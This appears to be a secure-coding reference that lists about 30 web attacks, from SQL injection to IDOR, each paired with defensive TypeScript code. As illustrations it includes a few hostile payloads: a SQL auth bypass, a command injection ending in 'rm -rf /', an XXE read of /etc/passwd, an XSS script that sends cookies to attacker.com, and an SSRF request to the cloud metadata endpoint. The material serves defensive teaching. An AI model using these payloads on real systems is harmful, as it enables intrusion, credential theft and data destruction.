# Attack Catalog

Complete reference for 25+ attack vectors with defenses. Read this when implementing defenses for a specific attack type.

---

## Category 1: Injection Attacks

### 1. SQL Injection
**Attack:** Malicious SQL embedded in user input alters the query structure.
```sql
-- Input: admin' OR '1'='1
SELECT * FROM users WHERE email = 'admin' OR '1'='1'  -- bypasses auth
```
**Defense:** Use parameterized queries or ORM. Never concatenate user input into SQL.
```typescript
// WRONG
const query = `SELECT * FROM users WHERE email = '${email}'`

// RIGHT — Prisma/Drizzle/Supabase use parameterized queries automatically
const user = await prisma.user.findUnique({ where: { email } })
const { data } = await supabase.from('users').select().eq('email', email)
```

### 2. NoSQL Injection
**Attack:** In MongoDB-style queries, user input can modify the query operator.
```javascript
// Input: { "$gt": "" } as the password field
db.users.find({ email: "admin@test.com", password: { $gt: "" } })  // matches all
```
**Defense:** Validate all inputs with a strict schema. Reject objects where strings are expected.
```typescript
const LoginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1).max(200),  // string only — rejects { $gt: "" }
})
```

### 3. Command Injection
**Attack:** User input is passed to a shell command.
```typescript
// Input: "image.jpg; rm -rf /"
exec(`convert uploads/${filename} output.png`)  // CATASTROPHIC
```
**Defense:** Never use exec/shell with user input. Use libraries directly.
```typescript
// RIGHT — use sharp directly, no shell involved
await sharp(buffer).resize(800).toFile(outputPath)
```

### 4. LDAP Injection
**Attack:** Special LDAP characters in user input alter directory queries.
**Defense:** Escape LDAP special characters: `\ * ( ) NUL`. Use LDAP libraries with parameterized queries.

### 5. XML / XXE (XML External Entity)
**Attack:** Malicious XML with external entity references reads local files or makes SSRF requests.
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```
**Defense:** Disable external entity processing in XML parsers.
```typescript
import { XMLParser } from 'fast-xml-parser'
const parser = new XMLParser({ processEntities: false, ignoreAttributes: false })
```

### 6. Template Injection (SSTI)
**Attack:** User input is rendered inside a template engine, executing as code.
```javascript
// Input: {{7*7}} or <%= 7*7 %>
res.render('template', { userInput })  // renders "49" — or worse, executes system calls
```
**Defense:** Never pass raw user input to template engines as template strings. Use as data only.

---

## Category 2: Authentication Attacks

### 7. Brute Force / Credential Stuffing
**Attack:** Automated attempts with common passwords or leaked credential databases.
**Defense:**
- Rate limiting: 5 attempts per minute per IP on login
- Account lockout: lock after 10 failed attempts, require email verification to unlock
- argon2id: makes each attempt computationally expensive
- CAPTCHA after 3 failed attempts

### 8. JWT Attacks

**8a. Algorithm Confusion (none algorithm)**
```javascript
// Attacker changes header to { "alg": "none" } and removes signature
jwt.verify(token, secret, { algorithms: ['HS256'] })  // must pin algorithm
```

**8b. Algorithm switching (RS256 → HS256)**
An attacker with the public key signs a new token using HMAC with the public key as the HMAC secret, then submits it expecting the server to verify with the public key.
```typescript
// Always pin the algorithm explicitly
jwt.verify(token, secret, { algorithms: ['HS256'] })  // never omit algorithms array
```

**8c. JWT secret brute force**
Weak secrets can be brute-forced offline. Use at least 256 bits of entropy.
```bash
# Generate a secure secret
openssl rand -hex 64
```

### 9. Session Fixation
**Attack:** Attacker fixes a session ID before authentication, then hijacks the session after the victim logs in.
**Defense:** Always regenerate the session ID after authentication.
```typescript
// After successful login — destroy old session, create new one
req.session.regenerate((err) => {
  req.session.userId = user.id
})
```

### 10. OAuth Misconfiguration

**10a. Open redirect via redirect_uri**
```
/oauth/callback?redirect_uri=https://attacker.com
```
**Defense:** Whitelist allowed redirect URIs. Never accept arbitrary redirect_uri from the request.

**10b. PKCE missing**
For public clients (mobile, SPA), always use PKCE (Proof Key for Code Exchange). Without it, authorization codes can be intercepted.

### 11. Password Reset Poisoning
**Attack:** Attacker modifies the Host header to poison the password reset link.
**Defense:** Use a hardcoded base URL from config, never from request headers.
```typescript
// WRONG
const resetLink = `${req.headers.host}/reset?token=${token}`

// RIGHT
const resetLink = `${process.env.APP_BASE_URL}/reset?token=${token}`
```

---

## Category 3: File Upload Attacks

### 12. MIME Type Spoofing
**Attack:** Rename `malware.php` to `photo.jpg`. Server trusts the extension or Content-Type header.
**Defense:** Detect MIME type from file magic bytes, not from client-provided headers.
```typescript
import { fileTypeFromBuffer } from 'file-type'
const detected = await fileTypeFromBuffer(buffer)
// detected.mime is from the actual file content — cannot be spoofed
```

### 13. Malicious EXIF / Metadata
**Attack:** Inject scripts, GPS tracking, or executable payloads in EXIF metadata.
**Defense:** Strip all metadata using sharp before storing.
```typescript
await sharp(buffer).rotate().toBuffer()  // .rotate() applies and strips EXIF
```

### 14. Polyglot Files
**Attack:** A file that is simultaneously valid as two formats (e.g., a JPEG that is also a valid ZIP or PDF containing scripts).
**Defense:** Re-encode through sharp. A polyglot file re-encoded as a pure JPEG loses its second identity.
```typescript
const sanitized = await sharp(buffer).jpeg({ quality: 85 }).toBuffer()
```

### 15. Zip Bombs (Decompression Bomb)
**Attack:** A highly compressed file that expands to gigabytes when decompressed, exhausting memory/disk.
**Defense:**
- Check compressed size before processing
- Set hard limits on decompressed size
- Use streaming decompression with byte counting
```typescript
const MAX_UNCOMPRESSED = 50 * 1024 * 1024  // 50 MB limit
// Count bytes while streaming, abort if limit exceeded
```

### 16. Path Traversal via Filename
**Attack:** `filename = "../../etc/passwd"` saves to an unintended location.
**Defense:** Never use user-provided filenames. Generate server-side.
```typescript
const filename = `${crypto.randomUUID()}.${ext}`  // unpredictable, safe
```

### 17. Upload to Web Root
**Attack:** Uploading a server-side script to a web-accessible directory, then requesting it to execute.
**Defense:** Store uploads in isolated cloud storage (S3, Supabase Storage), never in the web root. Serve via signed URLs, not direct paths.

---

## Category 4: Web Application Attacks

### 18. XSS — Reflected / Stored / DOM-based
**Attack:** Injecting scripts into pages viewed by other users.
```html
<!-- Stored XSS: comment with script tag -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```
**Defense:**
- React escapes output automatically — never use `dangerouslySetInnerHTML` with user content
- If HTML rendering is needed: `DOMPurify.sanitize(content)` before rendering
- CSP header prevents inline script execution

### 19. CSRF (Cross-Site Request Forgery)
**Attack:** Malicious site makes authenticated requests on behalf of a logged-in user.
**Defense:**
- `SameSite=Lax` or `SameSite=Strict` on session cookies
- CSRF token for state-changing requests
- Verify `Origin` header on sensitive endpoints
```typescript
// Check that request origin matches expected domain
const origin = req.headers.get('origin')
if (origin !== process.env.APP_BASE_URL) {
  return Response.json({ error: 'Forbidden' }, { status: 403 })
}
```

### 20. SSRF (Server-Side Request Forgery)
**Attack:** Server fetches a URL provided by the attacker, reaching internal services.
```typescript
// Input: http://169.254.169.254/latest/meta-data/ (AWS metadata service)
const res = await fetch(userProvidedUrl)  // leaks cloud credentials
```
**Defense:**
- Whitelist allowed URLs/domains
- Block private IP ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x, 169.254.x.x, 127.x.x.x
- Use a URL parsing library, not regex
```typescript
import { isPrivateIp } from 'is-private-ip'
const url = new URL(userProvidedUrl)
if (isPrivateIp(url.hostname)) throw new Error('SSRF attempt blocked')
```

### 21. Clickjacking
**Attack:** Site embedded in an iframe, user clicks on invisible overlaid elements.
**Defense:** `X-Frame-Options: DENY` and `frame-ancestors 'none'` in CSP.

### 22. Open Redirect
**Attack:** `?redirect=https://phishing-site.com` after login.
**Defense:**
```typescript
// Only allow relative URLs
function safeRedirect(url: string): string {
  if (url.startsWith('http://') || url.startsWith('https://') || url.startsWith('//')) {
    return '/dashboard'  // default safe redirect
  }
  return url
}
```

### 23. CORS Misconfiguration
**Attack:** API reflects any Origin, allowing cross-origin credential sharing.
```typescript
// WRONG
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true  // credentials + wildcard = vulnerability

// RIGHT
const allowedOrigins = ['https://app.example.com', 'https://www.example.com']
const origin = req.headers.get('origin')
if (origin && allowedOrigins.includes(origin)) {
  headers.set('Access-Control-Allow-Origin', origin)
}
```

---

## Category 5: Denial of Service

### 24. ReDoS (Regex Denial of Service)
**Attack:** Malicious input triggers catastrophic backtracking in a regex.
```typescript
// WRONG — vulnerable regex
const emailRegex = /^([a-zA-Z0-9])(([a-zA-Z0-9])*([._-])?([a-zA-Z0-9])*)*@.../
// Input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" — hangs the process

// RIGHT — use Zod's built-in email validation (uses safe regex internally)
z.string().email()
```

### 25. Large Payload Flooding
**Attack:** Sending extremely large JSON bodies to exhaust memory/CPU during parsing.
**Defense:**
```typescript
// Next.js — limit request body size
export const config = {
  api: { bodyParser: { sizeLimit: '1mb' } }
}
```

### 26. Slowloris
**Attack:** Keep many connections open with slow partial requests, exhausting connection pool.
**Defense:** Set request timeout. Let a reverse proxy (Nginx, Cloudflare) handle connection-level timeouts.

---

## Category 6: Data Exposure

### 27. Mass Assignment
**Attack:** Client sends extra fields that map to privileged model attributes.
```typescript
// Input: { name: "Alice", role: "admin" }
await db.users.update({ id }, req.body)  // updates role too
```
**Defense:** Explicit schema allowlist (Zod strips unknown fields by default).

### 28. IDOR (Insecure Direct Object Reference)
**Attack:** Accessing another user's data by changing an ID in the URL.
```
GET /api/users/123/documents   ← change 123 to 124 → access other user's docs
```
**Defense:**
```typescript
// Always verify ownership server-side
const doc = await db.documents.findUnique({ where: { id: docId } })
if (doc?.authorId !== authenticatedUserId) {
  return Response.json({ error: 'Forbidden' }, { status: 403 })
}
```

### 29. Sensitive Data in Logs
**Attack:** Passwords, tokens, credit card numbers logged and later exfiltrated.
**Defense:**
```typescript
// WRONG
console.log('Login attempt:', { email, password })

// RIGHT — log intent, never values
console.log('Login attempt:', { email, passwordProvided: !!password })
```

### 30. API Key / Secret Leakage
**Attack:** Secrets committed to git, exposed in client bundles, or returned in API responses.
**Defense:**
- All secrets in environment variables, never in code
- `NEXT_PUBLIC_` prefix only for truly public values
- Use `.env.local` (gitignored) for local secrets
- Audit API responses — never return full user objects with internal fields
```typescript
// Strip internal fields before returning
const { password, internalNotes, stripeCustomerId, ...publicUser } = user
return Response.json(publicUser)
```

---

## Quick Defense Reference

| Attack | Primary Defense |
|--------|----------------|
| SQL Injection | Parameterized queries (ORM) |
| NoSQL Injection | Schema validation (Zod) |
| Command Injection | Avoid shell, use libraries |
| XSS | React escaping + DOMPurify + CSP |
| CSRF | SameSite cookies + Origin check |
| SSRF | URL whitelist + private IP block |
| Brute force | Rate limit + argon2id |
| JWT attacks | Pin algorithm + strong secret |
| File upload | content MIME + sharp re-encode + size limit |
| Path traversal | Random server-generated filenames |
| Mass assignment | Zod schema allowlist |
| IDOR | Server-side ownership check |
| Zip bomb | Decompressed size limit |
| ReDoS | Use Zod / avoid backtracking regex |
| Secret leakage | Env vars + response sanitization |
